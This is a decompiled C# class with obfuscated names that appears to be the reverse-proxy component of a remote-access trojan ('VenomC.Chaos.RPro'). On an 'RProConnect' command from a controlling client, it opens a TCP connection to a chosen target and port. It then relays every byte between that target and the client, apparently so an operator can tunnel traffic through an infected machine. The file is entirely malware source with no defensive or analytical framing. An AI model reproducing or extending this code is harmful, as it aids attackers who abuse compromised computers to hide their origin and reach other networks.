using System;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using VenomC.Chaos.RPro.Packets;

public class GClass9
{
	public const int int_0 = 8192;

	[CompilerGenerated]
	private int int_1;

	[CompilerGenerated]
	private Socket socket_0;

	[CompilerGenerated]
	private string string_0;

	[CompilerGenerated]
	private int int_2;

	[CompilerGenerated]
	private GClass13 gclass13_0;

	private byte[] byte_0;

	private bool bool_0;

	public int ConnectionId
	{
		[CompilerGenerated]
		get
		{
			return int_1;
		}
		[CompilerGenerated]
		private set
		{
			int_1 = value;
		}
	}

	public Socket Handle
	{
		[CompilerGenerated]
		get
		{
			return socket_0;
		}
		[CompilerGenerated]
		private set
		{
			socket_0 = value;
		}
	}

	public string Target
	{
		[CompilerGenerated]
		get
		{
			return string_0;
		}
		[CompilerGenerated]
		private set
		{
			string_0 = value;
		}
	}

	public int Port
	{
		[CompilerGenerated]
		get
		{
			return int_2;
		}
		[CompilerGenerated]
		private set
		{
			int_2 = value;
		}
	}

	public GClass13 Client
	{
		[CompilerGenerated]
		get
		{
			return gclass13_0;
		}
		[CompilerGenerated]
		private set
		{
			gclass13_0 = value;
		}
	}

	public GClass9(RProConnect command, GClass13 client)
	{
		ConnectionId = command.ConnectionId;
		Target = command.Target;
		Port = command.Port;
		Client = client;
		Handle = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		Handle.BeginConnect(command.Target, command.Port, method_0, null);
	}

	private void method_0(IAsyncResult ar)
	{
		try
		{
			Handle.EndConnect(ar);
		}
		catch
		{
		}
		if (Handle.Connected)
		{
			try
			{
				byte_0 = new byte[8192];
				Handle.BeginReceive(byte_0, 0, byte_0.Length, SocketFlags.None, method_1, null);
			}
			catch
			{
				new RProConResponse(ConnectionId, isConnected: false, null, 0, Target).Execute(Client);
				method_2();
			}
			IPEndPoint iPEndPoint = (IPEndPoint)Handle.LocalEndPoint;
			new RProConResponse(ConnectionId, isConnected: true, iPEndPoint.Address, iPEndPoint.Port, Target).Execute(Client);
		}
		else
		{
			new RProConResponse(ConnectionId, isConnected: false, null, 0, Target).Execute(Client);
		}
	}

	private void method_1(IAsyncResult ar)
	{
		try
		{
			int num = Handle.EndReceive(ar);
			if (num <= 0)
			{
				method_2();
				return;
			}
			byte[] array = new byte[num];
			Array.Copy(byte_0, array, num);
			new RProDat(ConnectionId, array).Execute(Client);
		}
		catch
		{
			method_2();
			return;
		}
		try
		{
			Handle.BeginReceive(byte_0, 0, byte_0.Length, SocketFlags.None, method_1, null);
		}
		catch
		{
			method_2();
		}
	}

	public void method_2()
	{
		if (!bool_0)
		{
			bool_0 = true;
			new RProDisco(ConnectionId).Execute(Client);
		}
		try
		{
			Handle.Close();
		}
		catch
		{
		}
		Client.method_15(ConnectionId);
	}

	public void method_3(byte[] data)
	{
		try
		{
			Handle.Send(data);
		}
		catch
		{
			method_2();
		}
	}
}
